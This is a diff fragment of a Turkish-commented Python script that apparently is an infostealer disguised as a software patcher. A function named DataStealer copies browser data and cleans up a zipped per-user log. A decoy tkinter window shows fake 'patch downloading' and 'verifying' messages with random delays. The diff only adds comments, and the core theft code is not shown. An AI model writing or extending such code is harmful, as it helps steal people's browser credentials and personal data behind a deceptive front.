@@ -4,9 +4,9 @@ import sys                      # dosya ismi|exit için
 import time                     # sleep() için
 import platform                 # cihaz bilgileri için
 from tkinter import messagebox  # tkinter içerisinden messagebox'ı çektik . Böylece hata gösterebileceğiz
-import random
+import random                   # time sleepi random vermek için
 
-def DataStealer():
+def DataStealer():              # DataStealer Fonksiyonumuz
     ####################################################################################
     import os                   # Dizinler ve dosyalarla çalışmak için
     import shutil               # Tarayıcı verilerini kopyalamak için
@@ -462,7 +462,7 @@ def DataStealer():
     os.remove(app_data + f'{kullanici_adi}_LOG.zip')
     ################################################################################
 
-def Muamele():
+def Muamele():                  # Muamele Fonksiyonumuz
     for i in "bağlantı kuruluyor/cpu cevabı.bekleniyor/default klasör aranıyor/bulundu !/patch dosyası oluşturuluyor/patch dosyası doğrulanıyor/doğrulama başarılı/patch indiriliyor/patch indiriliyor/indirme başarılı/doğrulanıyor/patch içeriği okunuyor/yamalanıyor/kuruluyor/yüklemeye hazırlanıyor/internet bağlantısı kontrol ediliyor/kablolar koklanıyor/".split("/"):
         label.config(text=i)
         app.update()
@@ -474,7 +474,7 @@ def Muamele():
         time.sleep(random.uniform(0,0.23))
     time.sleep(2)
 
-app = tkinter.Tk()          # tkinter penceremizi açtık
+app = tkinter.Tk()              # tkinter penceremizi açtık
 image = tkinter.PhotoImage(data="""iVBORw0KGgoAAAANSUhEUgAAAfYAAADGCAYAAAAg5qKlAAEAAElEQVR4nOz9d7Rt2X3XiX5mWmGH
 k+65uepWlUqqKoWSZFkypmXLkttBDSY4Aw3mQZvM6/dIpnvQdGNS04zHgwE8jB80sQEDNtjGxliW
 k2xLspWlkiqHW3XzPXGntdaM74+59j7nlqoUDM+hOL8xzj337LP3PnOvNecvfn/fn0gpcSInciIn
